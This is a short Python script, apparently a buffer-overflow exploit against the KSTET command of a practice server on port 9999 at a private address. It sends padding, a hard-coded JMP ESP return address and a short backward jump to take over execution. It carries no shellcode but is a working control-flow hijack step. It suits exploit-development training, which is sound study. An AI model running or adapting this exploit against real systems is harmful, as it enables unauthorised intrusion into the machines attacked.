import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#JMP ESP 625011C7
# EB C2 $ESP-70
buffer = "KSTET /.:/ " + "A"*70 + "\xc7\x11\x50\x62" + "\xeb\xb8\x90\x90" + "X"*900
s.connect(('172.16.0.24',9999))
s.recv(1024)
s.send(buffer)
s.close()
